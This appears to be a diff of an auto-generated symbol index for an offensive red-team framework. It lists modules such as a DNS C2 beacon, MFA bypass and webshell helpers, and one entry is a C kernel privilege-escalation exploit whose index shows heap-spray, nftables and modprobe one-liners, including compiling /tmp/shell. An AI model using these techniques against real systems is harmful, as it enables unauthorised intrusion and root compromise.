-  - `cred_add` (method, line 500) `def cred_add(self, host_id, username, password, realm, cred_type, origin)`
-  - `cred_list` (method, line 520) `def cred_list(self, workspace_id)`
-  - `loot_add` (method, line 539) `def loot_add(self, workspace_id, name, loot_type, path, notes, host_id)`
-  - `loot_list` (method, line 558) `def loot_list(self, workspace_id)`
-  - `note_add` (method, line 574) `def note_add(self, workspace_id, data, note_type, host_id)`
-  - `note_list` (method, line 591) `def note_list(self, workspace_id)`
-  - `import_nmap_xml` (method, line 607) `def import_nmap_xml(self, workspace_id, xml_path)`
-  - `export_csv` (method, line 685) `def export_csv(self, table, workspace_id)`
-  - `status` (method, line 720) `def status(self, workspace_id)`
-  - `close` (method, line 749) `def close(self)`
+  - `default_workspace` (method, line 321) `def default_workspace(self, name)`
+  - `workspace_delete` (method, line 334) `def workspace_delete(self, name)`
+  - `host_add` (method, line 363) `def host_add(self, workspace_id, address, mac, hostname, os, state)`
+  - `host_delete` (method, line 396) `def host_delete(self, host_id)`
+  - `host_list` (method, line 407) `def host_list(self, workspace_id)`
+  - `host_find` (method, line 416) `def host_find(self, workspace_id, query)`
+  - `service_add` (method, line 433) `def service_add(self, host_id, port, protocol, state, name, product, version)`
+  - `service_list` (method, line 453) `def service_list(self, host_id)`
+  - `vuln_add` (method, line 466) `def vuln_add(self, host_id, name, severity, description, refs)`
+  - `vuln_list` (method, line 484) `def vuln_list(self, workspace_id, severity)`
+  - `cred_add` (method, line 513) `def cred_add(self, host_id, username, password, realm, cred_type, origin)`
+  - `cred_list` (method, line 533) `def cred_list(self, workspace_id)`
+  - `loot_add` (method, line 552) `def loot_add(self, workspace_id, name, loot_type, path, notes, host_id)`
+  - `loot_list` (method, line 571) `def loot_list(self, workspace_id)`
+  - `note_add` (method, line 587) `def note_add(self, workspace_id, data, note_type, host_id)`
+  - `note_list` (method, line 604) `def note_list(self, workspace_id)`
+  - `import_nmap_xml` (method, line 620) `def import_nmap_xml(self, workspace_id, xml_path)`
+  - `export_csv` (method, line 698) `def export_csv(self, table, workspace_id)`
+  - `status` (method, line 733) `def status(self, workspace_id)`
+  - `close` (method, line 762) `def close(self)`
 - Depends on: `core/config.py`, `core/crypto.py`, `core/logging.py`
-- Imported by: `cli/commands/campaign.py`, `cli/commands/collaboration.py`, `cli/commands/database.py`, `lazyown.py`, `modules/autonomous_exploit_engine.py`, `modules/estorides_importer.py`, `modules/estorides_importer.py`, `modules/estorides_importer.py`, `modules/hash_cracker.py`, `modules/integrations/nuclei_parser.py`, `modules/opsec_scorer.py`, `modules/state_manager.py`, `mutants/tests/test_db.py`, `mutants/tests/test_mutation_verification.py`, `mutants/tests/test_security_hardening.py`, `skills/lazyown_mcp.py`, `tests/test_db.py`, `tests/test_mutation_verification.py`, `tests/test_security_hardening.py`
+- Imported by: `cli/commands/campaign.py`, `cli/commands/collaboration.py`, `cli/commands/database.py`, `lazyown.py`, `modules/autonomous_exploit_engine.py`, `modules/estorides_importer.py`, `modules/estorides_importer.py`, `modules/estorides_importer.py`, `modules/hash_cracker.py`, `modules/integrations/nuclei_parser.py`, `modules/opsec_scorer.py`, `modules/state_manager.py`, `scripts/devtools/core_smoke.py`, `skills/lazyown_mcp.py`, `tests/test_db.py`, `tests/test_mutation_verification.py`, `tests/test_security_hardening.py`
 
 ## modules/delegation_attacks.py
 - Layer: utility
@@ -1103,7 +1113,7 @@
   - `load_cached_rules` (method, line 241) `def load_cached_rules(self, source)`
   - `adjust_from_feedback` (method, line 263) `def adjust_from_feedback(self, feedback_file)`
 - Depends on: `core/logging.py`, `modules/detection_oracle.py`
-- Imported by: `modules/detection_oracle.py`, `modules/detection_oracle.py`, `mutants/tests/test_detection_feed.py`, `tests/test_detection_feed.py`
+- Imported by: `modules/detection_oracle.py`, `modules/detection_oracle.py`, `tests/test_detection_feed.py`
 
 ## modules/detection_oracle.py
 - Layer: utility
@@ -1127,14 +1137,14 @@
   - `_aggregate_probability` (method, line 432) `def _aggregate_probability(self, matched, action_category)`
   - `_build_recommendation` (method, line 449) `def _build_recommendation(probability, matched, action_category)`
 - Depends on: `core/logging.py`, `modules/detection_feed.py`
-- Imported by: `modules/auto_purple.py`, `modules/auto_purple.py`, `modules/detection_feed.py`, `mutants/tests/test_detection_feed.py`, `mutants/tests/test_moe_rl_swan.py`, `mutants/tests/test_moe_rl_swan.py`, `mutants/tests/test_moe_rl_swan.py`, `mutants/tests/test_moe_rl_swan.py`, `mutants/tests/test_moe_rl_swan.py`, `mutants/tests/test_moe_rl_swan.py`, `mutants/tests/test_moe_rl_swan.py`, `mutants/tests/test_moe_rl_swan.py`, `mutants/tests/test_moe_rl_swan.py`, `skills/autonomous_daemon.py`, `skills/autonomous_daemon.py`, `skills/lazyown_policy.py`, `skills/swan_agent.py`, `tests/test_detection_feed.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`
+- Imported by: `modules/auto_purple.py`, `modules/auto_purple.py`, `modules/detection_feed.py`, `skills/autonomous_daemon.py`, `skills/autonomous_daemon.py`, `skills/lazyown_policy.py`, `skills/swan_agent.py`, `tests/test_detection_feed.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`, `tests/test_moe_rl_swan.py`
 
 ## modules/dns_beacon.py
 - Layer: utility
 - Language: py
 - Symbols:
   - `DNSBeacon` (class, line 23) `class DNSBeacon`
-  - `DNSC2Server` (class, line 190) `class DNSC2Server`
+  - `DNSC2Server` (class, line 193) `class DNSC2Server`
   - `__init__` (method, line 38) `def __init__(self, domain, dns_server, sleep_seconds, jitter_percent, dns_type, encode_method)`
   - `_ensure_dnspython` (method, line 57) `def _ensure_dnspython(self)`
   - `_encode` (method, line 63) `def _encode(self, data)`
@@ -1145,13 +1155,14 @@
   - `check_in` (method, line 103) `def check_in(self)`
   - `send_result` (method, line 132) `def send_result(self, command, output, exit_code)`
   - `run` (method, line 165) `def run(self)`
-  - `__init__` (method, line 202) `def __init__(self, domain, log_source, interface)`
-  - `register_beacon` (method, line 216) `def register_beacon(self, beacon_id, hostname)`
-  - `list_beacons` (method, line 226) `def list_beacons(self)`
-  - `send_task` (method, line 230) `def send_task(self, beacon_id, command)`
-  - `process_query_log` (method, line 239) `def process_query_log(self, line)`
-  - `_handle_result` (method, line 285) `def _handle_result(self, labels, query)`
-  - `get_results` (method, line 318) `def get_results(self, beacon_id)`
+  - `__init__` (method, line 205) `def __init__(self, domain, log_source, interface)`
+  - `register_beacon` (method, line 219) `def register_beacon(self, beacon_id, hostname)`
+  - `list_beacons` (method, line 229) `def list_beacons(self)`
+  - `send_task` (method, line 233) `def send_task(self, beacon_id, command)`
+  - `process_query_log` (method, line 242) `def process_query_log(self, line)`
+  - `_handle_result` (method, line 288) `def _handle_result(self, labels, query)`
+  - `get_results` (method, line 321) `def get_results(self, beacon_id)`
+- Depends on: `core/safe_exec.py`
 - Imported by: `cli/commands/dns_exfil.py`
 
 ## modules/domain_dominance.py
@@ -1533,6 +1544,12 @@
   - `keyring_payload` (struct, line 120)
   - `leak` (struct, line 126)
   - `fd_uring` (struct, line 131)
+  - `msg` (struct, line 84)
+  - `msg_header` (struct, line 90)
+  - `Msg` (struct, line 100)
+  - `user_rule_t` (struct, line 105)
+  - `nft_trans_phase` (enum, line 77)
+  - `key_serial_t` (type_alias, line 135) `typedef int32_t key_serial_t;`
   - `add_key` (function, line 144) `static inline key_serial_t add_key(const char *type, const char *description, const void *payload...`
   - `keyctl` (function, line 150) `static inline long keyctl(int operation, unsigned long arg2, unsigned long arg3, unsigned long ar...`
   - `bye` (function, line 154) `void bye(char *info)`
@@ -1567,21 +1584,55 @@
   - `sema_up` (function, line 609) `void sema_up(int *sema)`
   - `sema_down` (function, line 614) `void sema_down(int *sema)`
   - `main` (function, line 619) `int main(int argc, char ** argv)`
-  - `_GNU_SOURCE` (macro, line 2)
-  - `MQUEUE_NUM` (macro, line 48)
-  - `INBOUND` (macro, line 50)
-  - `OUTBOUND` (macro, line 53)
-  - `DESC_MAX` (macro, line 54)
-  - `BUFFER` (macro, line 55)
-  - `NAMELEN` (macro, line 57)
-  - `ERROR_PREFIX` (macro, line 58)
-  - `KEY_DESC_MAX_SIZE` (macro, line 59)
-  - `PREFIX_BUF_LEN` (macro, line 61)
-  - `RCU_HEAD_LEN` (macro, line 63)
-  - `SPRAY_KEY_SIZE` (macro, line 64)
-  - `PHYSMAP_MASK` (macro, line 66)
-  - `SPRAY_SIZE` (macro, line 68)
-  - `SPRAY_NB_ENTRIES` (macro, line 70)
+  - `syscall` (function, line 148) `return syscall(__NR_add_key, type, description, payload, plen, ringid);`
+  - `puts` (function, line 157) `puts(info);`
+  - `exit` (function, line 158) `exit(-2);`
+  - `printf` (function, line 169) `printf(info, arg);`
+  - `snprintf` (function, line 181) `snprintf(key_desc, KEY_DESC_MAX_SIZE, "SPRAY-RING-%03du", i);`
+  - `memcpy` (function, line 197) `memcpy(temp+0x0, &next, 8);`
+  - `free` (function, line 286) `free(id_buffer);`
+  - `unshare` (function, line 301) `unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET);`
+  - `write` (function, line 305) `write(temp, "deny", strlen("deny"));`
+  - `close` (function, line 306) `close(temp);`
+  - `nftnl_table_set_str` (function, line 331) `nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);`
+  - `nftnl_table_set_u32` (function, line 332) `nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, 0);`
+  - `nftnl_set_set_str` (function, line 336) `nftnl_set_set_str(set_stable, NFTNL_SET_TABLE, table_name);`
+  - `nftnl_set_set_u32` (function, line 338) `nftnl_set_set_u32(set_stable, NFTNL_SET_KEY_LEN, 1);`
+  - `nftnl_batch_begin` (function, line 351) `nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);`
+  - `mnl_nlmsg_batch_next` (function, line 353) `mnl_nlmsg_batch_next(batch);`
+  - `nftnl_table_nlmsg_build_payload` (function, line 360) `nftnl_table_nlmsg_build_payload(nlh, table);`
+  - `nftnl_set_nlmsg_build_payload` (function, line 367) `nftnl_set_nlmsg_build_payload(nlh, set_stable);`
+  - `nftnl_set_free` (function, line 368) `nftnl_set_free(set_stable);`
+  - `nftnl_batch_end` (function, line 370) `nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);`
+  - `err` (function, line 375) `err(1, "mnl_socket_open");`
+  - `nftnl_expr_set_str` (function, line 403) `nftnl_expr_set_str(exprs[exprid], NFTNL_EXPR_LOOKUP_SET, "set_stable");`
+  - `nftnl_expr_set_u32` (function, line 404) `nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_LOOKUP_SREG, NFT_REG_1);`
+  - `nftnl_set_add_expr` (function, line 405) `nftnl_set_add_expr(set_trigger, exprs[exprid]);`
+  - `CPU_ZERO` (function, line 440) `CPU_ZERO(&set);`
+  - `CPU_SET` (function, line 442) `CPU_SET(cpu_n, &set);`
+  - `mq_receive` (function, line 491) `mq_receive(mqdes, (char*) &msg, BUFFER, NULL);`
+  - `memset` (function, line 504) `memset(spray->mtext, 0x41, size - 0x30);`
+  - `perror` (function, line 513) `perror("msgsend failure");`
+  - `system` (function, line 578) `system("gcc -o /tmp/shell /tmp/shell.c -w");`
+  - `read` (function, line 588) `read(fd_modprobe, modprobe_name, 14);`
+  - `setvbuf` (function, line 622) `setvbuf(stdin, 0, 2, 0);`
+  - `sleep` (function, line 646) `sleep(1);`
+  - `execve` (function, line 649) `execve("/tmp/dummy", NULL, NULL);`
+  - `_GNU_SOURCE` (macro, line 2) `#define _GNU_SOURCE`
+  - `MQUEUE_NUM` (macro, line 48) `#define MQUEUE_NUM`
+  - `INBOUND` (macro, line 50) `#define INBOUND`
+  - `OUTBOUND` (macro, line 53) `#define OUTBOUND`
+  - `DESC_MAX` (macro, line 54) `#define DESC_MAX`
+  - `BUFFER` (macro, line 55) `#define BUFFER`
+  - `NAMELEN` (macro, line 57) `#define NAMELEN`
+  - `ERROR_PREFIX` (macro, line 58) `#define ERROR_PREFIX`
+  - `KEY_DESC_MAX_SIZE` (macro, line 59) `#define KEY_DESC_MAX_SIZE`
+  - `PREFIX_BUF_LEN` (macro, line 61) `#define PREFIX_BUF_LEN`
+  - `RCU_HEAD_LEN` (macro, line 63) `#define RCU_HEAD_LEN`
+  - `SPRAY_KEY_SIZE` (macro, line 64) `#define SPRAY_KEY_SIZE`
+  - `PHYSMAP_MASK` (macro, line 66) `#define PHYSMAP_MASK`
+  - `SPRAY_SIZE` (macro, line 68) `#define SPRAY_SIZE`
+  - `SPRAY_NB_ENTRIES` (macro, line 70) `#define SPRAY_NB_ENTRIES`
 
 ## modules/exploit_chain.py
 - Layer: utility
@@ -1656,7 +1707,7 @@
   - `score_task` (function, line 565) `def score_task(task_id, success, techniques, params)`
   - `_run` (function, line 274) `def _run(name, cmd, cwd, timeout)`
 - Depends on: `modules/redteam_gym.py`
-- Imported by: `cli/commands/exploitgym.py`, `cli/commands/exploitgym.py`, `cli/commands/exploitgym.py`, `cli/commands/exploitgym.py`, `cli/commands/exploitgym.py`, `cli/commands/exploitgym.py`, `cli/commands/exploitgym.py`, `mutants/tests/test_exploitgym_gym.py`, `mutants/tests/test_exploitgym_gym.py`, `mutants/tests/test_exploitgym_gym.py`, `mutants/tests/test_exploitgym_gym.py`, `mutants/tests/test_exploitgym_gym.py`, `mutants/tests/test_exploitgym_gym.py`, `mutants/tests/test_exploitgym_gym.py`, `mutants/tests/test_exploitgym_gym.py`, `mutants/tests/test_exploitgym_gym.py`, `mutants/tests/test_exploitgym_gym.py`, `mutants/tests/test_exploitgym_gym.py`, `mutants/tests/test_exploitgym_gym.py`, `mutants/tests/test_exploitgym_gym.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `tests/test_exploitgym_gym.py`, `tests/test_exploitgym_gym.py`, `tests/test_exploitgym_gym.py`, `tests/test_exploitgym_gym.py`, `tests/test_exploitgym_gym.py`, `tests/test_exploitgym_gym.py`, `tests/test_exploitgym_gym.py`, `tests/test_exploitgym_gym.py`, `tests/test_exploitgym_gym.py`, `tests/test_exploitgym_gym.py`, `tests/test_exploitgym_gym.py`, `tests/test_exploitgym_gym.py`, `tests/test_exploitgym_gym.py`
+- Imported by: `cli/commands/exploitgym.py`, `cli/commands/exploitgym.py`, `cli/commands/exploitgym.py`, `cli/commands/exploitgym.py`, `cli/commands/exploitgym.py`, `cli/commands/exploitgym.py`, `cli/commands/exploitgym.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `tests/test_exploitgym_gym.py`, `tests/test_exploitgym_gym.py`, `tests/test_exploitgym_gym.py`, `tests/test_exploitgym_gym.py`, `tests/test_exploitgym_gym.py`, `tests/test_exploitgym_gym.py`, `tests/test_exploitgym_gym.py`, `tests/test_exploitgym_gym.py`, `tests/test_exploitgym_gym.py`, `tests/test_exploitgym_gym.py`, `tests/test_exploitgym_gym.py`, `tests/test_exploitgym_gym.py`, `tests/test_exploitgym_gym.py`
 
 ## modules/fast_run_service.sh
 - Layer: business_logic
@@ -1796,7 +1847,7 @@
   - `_parse_hashcat_output` (method, line 667) `def _parse_hashcat_output(stdout, stderr, original)`
   - `_parse_john_show` (method, line 682) `def _parse_john_show(show_output, original)`
 - Depends on: `core/logging.py`, `modules/db.py`
-- Imported by: `cli/commands/security.py`, `cli/commands/security.py`, `mutants/tests/test_hash_cracker.py`, `tests/test_hash_cracker.py`
+- Imported by: `cli/commands/security.py`, `cli/commands/security.py`, `tests/test_hash_cracker.py`
 
 ## modules/hive_invoke.py
 - Layer: utility
@@ -1850,9 +1901,9 @@
 - Language: py
 - Symbols:
   - `analyze_with_deepseek` (function, line 39) `def analyze_with_deepseek(packet_info, mode)`
-  - `packet_callback` (function, line 90) `def packet_callback(packet, mode)`
-  - `start_monitoring` (function, line 133) `def start_monitoring(interface, timeout, mode)`
-  - `parse_args` (function, line 150) `def parse_args()`
+  - `packet_callback` (function, line 91) `def packet_callback(packet, mode)`
+  - `start_monitoring` (function, line 130) `def start_monitoring(interface, timeout, mode)`
+  - `parse_args` (function, line 154) `def parse_args()`
 - Depends on: `core/console.py`, `core/logging.py`, `modules/logging_config.py`
 
 ## modules/icmp_client.py
@@ -1881,7 +1932,7 @@
   - `listen_for_icmp` (function, line 155) `def listen_for_icmp(interface, key)`
   - `main` (function, line 181) `def main()`
 - Depends on: `core/logging.py`, `modules/logging_config.py`
-- Imported by: `mutants/tests/test_security_hardening_v3.py`, `mutants/tests/test_security_hardening_v3.py`, `mutants/tests/test_security_hardening_v3.py`, `tests/test_security_hardening_v3.py`, `tests/test_security_hardening_v3.py`, `tests/test_security_hardening_v3.py`, `tests/test_security_hardening_v5.py`, `tests/test_security_hardening_v5.py`, `tests/test_security_hardening_v5.py`
+- Imported by: `tests/test_security_hardening_v3.py`, `tests/test_security_hardening_v3.py`, `tests/test_security_hardening_v3.py`, `tests/test_security_hardening_v5.py`, `tests/test_security_hardening_v5.py`, `tests/test_security_hardening_v5.py`
 
 ## modules/img2bin.py
 - Layer: utility
@@ -1922,7 +1973,7 @@
   - `get_intel_report` (method, line 818) `def get_intel_report(self)`
   - `_is_placeholder` (method, line 864) `def _is_placeholder(value)`
 - Depends on: `core/logging.py`, `modules/estorides_importer.py`, `modules/integrations/nuclei_bridge.py`, `modules/integrations/nuclei_parser.py`, `modules/obs_parser.py`, `modules/world_model.py`, `modules/yara_scanner.py`
-- Imported by: `cli/commands/mcp_bridge.py`, `cli/commands/recon.py`, `mutants/tests/test_intelligence_engine.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `tests/test_intelligence_engine.py`
+- Imported by: `cli/commands/mcp_bridge.py`, `cli/commands/recon.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `tests/test_intelligence_engine.py`
 
 ## modules/internal_discover.sh
 - Layer: infrastructure
@@ -2101,7 +2152,7 @@
   - `phase_index` (method, line 379) `def phase_index(phase)`
   - `snapshot` (method, line 384) `def snapshot(world_model_path)`
 - Depends on: `core/logging.py`, `modules/world_model.py`
-- Imported by: `cli/commands/ai.py`, `cli/dashboard_tui.py`, `cli/dashboard_tui.py`, `cli/dashboard_tui.py`, `cli/dashboard_tui.py`, `cli/killchain.py`, `cli/ops_commands.py`, `cli/ops_commands.py`, `cli/recon_plan.py`, `cli/tips_engine.py`, `cli/tips_engine.py`, `lazyc2.py`, `lazyc2.py`, `lazyc2.py`, `lazyc2.py`, `lazyc2.py`, `lazygui/panels/killchain_panel.py`, `modules/kill_chain_viz.py`, `modules/lazyown_bridge.py`, `modules/lazyown_bridge.py`, `modules/opsec_scorer.py`, `mutants/tests/test_killchain_snapshot.py`, `mutants/tests/test_killchain_unified_v2.py`, `skills/hermes-lazyown/constants.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `tests/test_killchain_snapshot.py`, `tests/test_killchain_unified_v2.py`
+- Imported by: `cli/commands/ai.py`, `cli/dashboard_tui.py`, `cli/dashboard_tui.py`, `cli/dashboard_tui.py`, `cli/dashboard_tui.py`, `cli/killchain.py`, `cli/ops_commands.py`, `cli/ops_commands.py`, `cli/recon_plan.py`, `cli/tips_engine.py`, `cli/tips_engine.py`, `lazyc2.py`, `lazyc2.py`, `lazyc2.py`, `lazyc2.py`, `lazyc2.py`, `lazygui/panels/killchain_panel.py`, `modules/kill_chain_viz.py`, `modules/lazyown_bridge.py`, `modules/lazyown_bridge.py`, `modules/opsec_scorer.py`, `scripts/devtools/core_smoke.py`, `skills/hermes-lazyown/constants.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `tests/test_killchain_snapshot.py`, `tests/test_killchain_unified_v2.py`
 
 ## modules/kivi.py
 - Layer: utility
@@ -2295,16 +2346,16 @@
 - Layer: utility
 - Language: py
 - Symbols:
-  - `base64_encode` (function, line 3) `def base64_encode(data)`
-  - `base64_decode` (function, line 6) `def base64_decode(data)`
-  - `caesar_cipher` (function, line 10) `def caesar_cipher(text, shift)`
-  - `caesar_decipher` (function, line 23) `def caesar_decipher(text, shift)`
-  - `key_substitution` (function, line 26) `def key_substitution(text, key)`
-  - `key_substitution_reverse` (function, line 41) `def key_substitution_reverse(text, key)`
-  - `encode` (function, line 56) `def encode(data, shift, key)`
-  - `encode_string` (function, line 67) `def encode_string(data, shift, key)`
-  - `decode` (function, line 73) `def decode(data, shift, key)`
-  - `decode_string` (function, line 84) `def decode_string(data, shift, key)`
+  - `base64_encode` (function, line 4) `def base64_encode(data)`
+  - `base64_decode` (function, line 8) `def base64_decode(data)`
+  - `caesar_cipher` (function, line 13) `def caesar_cipher(text, shift)`
+  - `caesar_decipher` (function, line 27) `def caesar_decipher(text, shift)`
+  - `key_substitution` (function, line 31) `def key_substitution(text, key)`
+  - `key_substitution_reverse` (function, line 47) `def key_substitution_reverse(text, key)`
+  - `encode` (function, line 63) `def encode(data, shift, key)`
+  - `encode_string` (function, line 75) `def encode_string(data, shift, key)`
+  - `decode` (function, line 82) `def decode(data, shift, key)`
+  - `decode_string` (function, line 94) `def decode_string(data, shift, key)`
 - Imported by: `modules/legacy/lazycreate_webshell.py`, `modules/legacy/lazylogpoisoning.py`, `modules/legacy/lazyreversentlmv2.py`, `modules/test_lazyencoder_decoder.py`, `utils.py`
 
 ## modules/lazyevilwimrm.sh
@@ -2460,7 +2511,7 @@
   - `catalog_count` (method, line 1889) `def catalog_count(self)`
   - `phase_kill_chain` (method, line 1892) `def phase_kill_chain(self)`
 - Depends on: `modules/killchain.py`
-- Imported by: `modules/unified_bridge.py`, `modules/unified_bridge.py`, `mutants/tests/test_bridge_catalog_filtered.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_exploitgym_gym.py`, `skills/lazyown_groq_agents.py`, `skills/lazyown_groq_agents.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `tests/test_bridge_catalog_filtered.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_exploitgym_gym.py`
+- Imported by: `modules/unified_bridge.py`, `modules/unified_bridge.py`, `skills/lazyown_groq_agents.py`, `skills/lazyown_groq_agents.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `tests/test_bridge_catalog_filtered.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_exploitgym_gym.py`
 
 ## modules/lazyown_metaextract0r.py
 - Layer: utility
@@ -2569,7 +2620,7 @@
   - `ingest_all` (method, line 180) `def ingest_all(self, lessons)`
   - `_load_from_file` (method, line 197) `def _load_from_file(self)`
 - Depends on: `core/logging.py`, `modules/moe_router.py`, `modules/rl_trainer.py`
-- Imported by: `mutants/tests/test_lesson_ingestor.py`, `skills/lazyown_campaign.py`, `tests/test_lesson_ingestor.py`
+- Imported by: `skills/lazyown_campaign.py`, `tests/test_lesson_ingestor.py`
 
 ## modules/lilsplunky.py
 - Layer: utility
@@ -2655,7 +2706,7 @@
   - `_emit_node` (function, line 106) `def _emit_node(node_id, state, title)`
   - `_emit_edge` (function, line 126) `def _emit_edge(source, target, relation, weight)`
 - Depends on: `modules/world_model.py`
-- Imported by: `lazyc2.py`, `modules/unified_dashboard.py`, `mutants/tests/test_live_surface.py`, `tests/test_live_surface.py`
+- Imported by: `lazyc2.py`, `modules/unified_dashboard.py`, `tests/test_live_surface.py`
 
 ## modules/llm_adapter.py
 - Layer: infrastructure
@@ -2729,7 +2780,7 @@
   - `compute_metrics` (method, line 200) `def compute_metrics(self, session_id)`
   - `quality_report` (method, line 241) `def quality_report(self, session_id)`
   - `export_finetuning_dataset` (method, line 256) `def export_finetuning_dataset(self, path)`
-- Imported by: `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `skills/lazyown_mcp.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`
+- Imported by: `skills/lazyown_mcp.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`
 
 ## modules/llm_factory.py
 - Layer: infrastructure
@@ -2757,7 +2808,7 @@
   - `get_llm_backend_raw` (method, line 585) `def get_llm_backend_raw(config, backend)`
   - `try_get_llm_backend` (method, line 607) `def try_get_llm_backend(config, backend)`
 - Depends on: `core/llm_budget.py`, `modules/ai_model.py`
-- Imported by: `cli/commands/ai.py`, `cli/wizard.py`, `core/payload_schema.py`, `lazyown.py`, `lazyown.py`, `modules/agent_runner.py`, `modules/ai_fallback.py`, `modules/legacy/lazyllmchat.py`, `modules/llm_adapter.py`, `modules/privesc_predictor.py`, `modules/vuln_agent.py`, `modules/vulnbot.py`, `modules/yaml_generator.py`, `skills/claude_md_orchestrator/sdd_agent.py`, `tests/test_ai_commands_llm.py`, `tests/test_llm_adapter_parity.py`, `tests/test_llm_adapter_parity.py`, `tests/test_llm_adapter_parity.py`, `tests/test_llm_adapter_parity.py`, `tests/test_llm_adapter_parity.py`, `tests/test_llm_adapter_parity.py`, `tests/test_payload_schema.py`, `tests/test_payload_schema.py`, `tests/test_wizard_llm.py`
+- Imported by: `cli/commands/ai.py`, `cli/wizard.py`, `core/payload_schema.py`, `lazyown.py`, `lazyown.py`, `modules/agent_runner.py`, `modules/ai_fallback.py`, `modules/ai_fallback.py`, `modules/legacy/lazyllmchat.py`, `modules/llm_adapter.py`, `modules/privesc_predictor.py`, `modules/vuln_agent.py`, `modules/vulnbot.py`, `modules/yaml_generator.py`, `skills/claude_md_orchestrator/sdd_agent.py`, `tests/test_ai_commands_llm.py`, `tests/test_llm_adapter_parity.py`, `tests/test_llm_adapter_parity.py`, `tests/test_llm_adapter_parity.py`, `tests/test_llm_adapter_parity.py`, `tests/test_llm_adapter_parity.py`, `tests/test_llm_adapter_parity.py`, `tests/test_payload_schema.py`, `tests/test_payload_schema.py`, `tests/test_wizard_llm.py`
 
 ## modules/llm_prompts.py
 - Layer: utility
@@ -2943,7 +2994,7 @@
   - `recall_for_service` (method, line 277) `def recall_for_service(self, service_name, top_k)`
   - `stats` (method, line 280) `def stats(self)`
   - `export_finetuning_dataset` (method, line 288) `def export_finetuning_dataset(self, path)`
-- Imported by: `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`
+- Imported by: `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`
 
 ## modules/metrics.py
 - Layer: utility
@@ -2974,7 +3025,7 @@
   - `summarize` (method, line 429) `def summarize(self, window_seconds)`
   - `tail` (method, line 445) `def tail(self, n)`
 - Depends on: `core/logging.py`
-- Imported by: `lazyc2.py`, `lazyown.py`, `lazyown.py`, `modules/c2_builder.py`, `mutants/tests/test_metrics.py`, `skills/autonomous_daemon.py`, `skills/autonomous_daemon.py`, `skills/lazyown_mcp.py`, `tests/test_metrics.py`
+- Imported by: `lazyc2.py`, `lazyown.py`, `lazyown.py`, `modules/c2_builder.py`, `skills/autonomous_daemon.py`, `skills/autonomous_daemon.py`, `skills/lazyown_mcp.py`, `tests/test_metrics.py`
 
 ## modules/mfa_bypass.py
 - Layer: utility
@@ -3031,7 +3082,7 @@
   - `__iter__` (method, line 496) `def __iter__(self)`
   - `__contains__` (method, line 501) `def __contains__(self, name)`
 - Depends on: `core/logging.py`
